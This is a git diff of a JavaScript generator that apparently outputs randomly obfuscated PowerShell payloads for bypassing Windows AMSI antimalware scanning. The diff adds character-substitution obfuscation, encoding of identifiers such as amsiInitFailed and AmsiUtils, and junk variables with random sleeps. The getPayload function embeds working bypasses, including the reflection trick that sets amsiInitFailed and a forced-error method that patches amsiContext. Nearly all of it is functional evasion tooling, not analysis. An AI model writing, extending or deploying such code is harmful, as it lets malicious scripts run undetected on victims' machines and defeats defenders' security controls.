@@ -170,8 +170,20 @@ function getRandomDiacritic(asciiValue){
             max = 216
             return String.fromCharCode(min + randomInt(max - min))
         case 69: //E
-            min = 236
-            max = 239
+            min = 200
+            max = 203
+            return String.fromCharCode(min + randomInt(max - min))
+        case 101: //e
+            min = 232
+            max = 235
+            return String.fromCharCode(min + randomInt(max - min))
+        case 85:  //U
+            min = 217
+            max = 220
+            return String.fromCharCode(min + randomInt(max - min))
+        case 117: //u
+            min = 249
+            max = 252
             return String.fromCharCode(min + randomInt(max - min))
         case 111: //o
             min = 243
@@ -187,7 +199,7 @@ function getRandomDiacritic(asciiValue){
  * @param {String} input
  * @returns {String} a obfuscated string using obfuscateChar or Diacritics
  */
-function obfuscateString(input){
+ function obfuscateString(input){
     switch (randomInt(2)) {
         case 0:
             return [...input].map(c => obfuscateChar(c)).join('')
@@ -206,17 +218,18 @@ function obfuscateString(input){
  * @param {String} input
  * @returns {String} a obfuscated version of the input
  */
-function encodePayload(input){
-
+ function encodePayload(input) {
     // Find all strings inside single quotes
-    const re = /\'(.*?)\'/g
+    const re = /\'(.*?)\'/g;
 
-    // obfuscate all strings inside single quotes
-    for (const match of input.matchAll(re)) {
-        let old = match[0]
-        let obf = obfuscateString(old.replaceAll("'", "")).substring(1)
-        input = input.replaceAll(old, `$(${obf})`)
-    }
+    // Obfuscate all strings inside single quotes, except for specific cases
+    input = input.replace(re, (match, p1) => {
+        if (p1.startsWith("System.") || p1.includes(".System.")) {
+            return match; // Keep the original string
+        }
+        let obf = obfuscateString(p1).substring(1);
+        return `$(${obf})`;
+    });
 
     const mustEncode = [
         "amsiContext",
@@ -224,36 +237,66 @@ function encodePayload(input){
         "AmsiUtils",
         "amsiInitFailed",
         "WriteInt32",
-	    "System",
         "Management",
-        "Automation"
-        
-    ]
+        "Automation",
+    ];
 
-    for (const word of mustEncode){
-        let obf = obfuscateString(word)
-        if (word == "amsiInitFailed"){
-            obf = `'+$(${obf.substring(1)})+'`
-        }else{
-            obf = `$(${obf.substring(1)})`
+    // Special handling for "System"
+    input = input.replace(/\bSystem\b(?!\.(?:Text\.Encoding|Convert|Reflection|Runtime|Management))/g, (match) => {
+        let obf = obfuscateString(match).substring(1);
+        return `$(${obf})`;
+    });
+
+    for (const word of mustEncode) {
+        let obf = obfuscateString(word).substring(1);
+        if (word === "amsiInitFailed") {
+            obf = `'+$(${obf})+'`;
+        } else {
+            obf = `$(${obf})`;
         }
-
-        input = input.replaceAll(word, obf)
+        input = input.replace(new RegExp(`\\b${word}\\b`, 'g'), obf);
     }
 
-    input = input.replace(";", ";$" + getRandomJunk() + "=\"" + obfuscateString(getRandomJunk())+ "\";[Threading.Thread]::Sleep(" +randomInt(2000)+");")
     
-    let nullValue = randomCase(randomString(randomInt(10)))
+    // Add random junk and sleep
+    const junk1 = getRandomJunk();
+    const junk2 = getRandomJunk();
+    input = input.replace(/;(?!$)/, `;$${junk1}="${obfuscateString(junk2)}";[Threading.Thread]::Sleep(${randomInt(2000)});`);
 
-    input = input.replace("$null","$" + nullValue)
+    // Replace $null with a random variable
+    const nullValue = randomCase(randomString(randomInt(10)));
+    input = input.replace(/\$null\b/g, `$${nullValue}`);
 
-    input + ";$" + getRandomJunk() + "=\"" + obfuscateString(getRandomJunk())+ "\";[Threading.Thread]::Sleep(" +randomInt(2000)+")"
+    // Add final junk and sleep
+    const junk3 = getRandomJunk();
+    const junk4 = getRandomJunk();
+    input += `;$${junk3}="${obfuscateString(junk4)}";[Threading.Thread]::Sleep(${randomInt(2000)})`;
 
-    input=  input.replace(";;","")
+    // Remove double semicolons
+    input = input.replace(/;;/g, ';');
 
-    return input.replace("\n","\n$" + nullValue + "=$null;")
+    // Add null assignment after newlines
+    input = input.replace(/\n/g, `\n$${nullValue}=$null;`);
+
+   // input = input.replace(/\$null\b/g, () => getRandomNullAlternative());
+
+    return input;
 }
 
+function getRandomNullAlternative() {
+    const alternatives = [
+        "[System.DBNull]::Value",
+        "[NullString]::Value",
+        "[System.Management.Automation.Internal.AutomationNull]::Value",
+        "[Void]",
+        "$()",
+        "@()",
+        "''",
+        "[String]::Empty",
+        "$PSItem"
+    ];
+    return alternatives[Math.floor(Math.random() * alternatives.length)];
+}
 
 /**
  * creates a random junk 
@@ -272,17 +315,23 @@ function encodePayload(input){
 
 
 /**
- * creates a random a-z string of given input length
+ * Creates a random string suitable for PowerShell variable names
  * @param {Integer} length
  * @returns {String} random string of a given length
  */
-function randomString(length){
-    const alphabet = "abcdefghijklmnopqrstuvwxyz"
-    let ret = ""
-    for(var i=0; i < length; i++){
-        ret += alphabet[Math.floor(Math.random() * alphabet.length)]
+ function randomString() {
+    const minLength = 3;
+    const maxLength = 20;
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789";
+
+    let ret = chars[Math.floor(Math.random() * 53)]; // First 53 characters (excluding numbers)
+    
+    for (let i = 1; i < length; i++) {
+        ret += chars[Math.floor(Math.random() * chars.length)];
     }
-    return ret
+    return ret;
 }
 
 /**
@@ -299,6 +348,11 @@ function encodeRasta(input){
     const varsToEncode = [
         "Win32",
         "LibLoad",
+        "lpAddress",
+        "flNewProtect",
+        "lpflOldProtect",
+        "hModule",
+        "procName",
         "MemAdr",
         "Patch",
         "var1",
@@ -328,7 +382,7 @@ function encodeRasta(input){
  * Randomly select a payload and encode it
  * @returns {String} a obfuscated random AMSI bypass
  */
-function getPayload(){
+ function getPayload(){
     let memvar = randomString(3 + randomInt(7));
     const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(${obfuscateInt(9076)});[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$${memvar});`
     const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}=\"System.Management.Automation.AmsiUtils\";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);`;
@@ -349,6 +403,7 @@ function getPayload(){
             return encodeRasta(RastaBuf)
     }
 }
+
 
 function GeneratePS(){
    
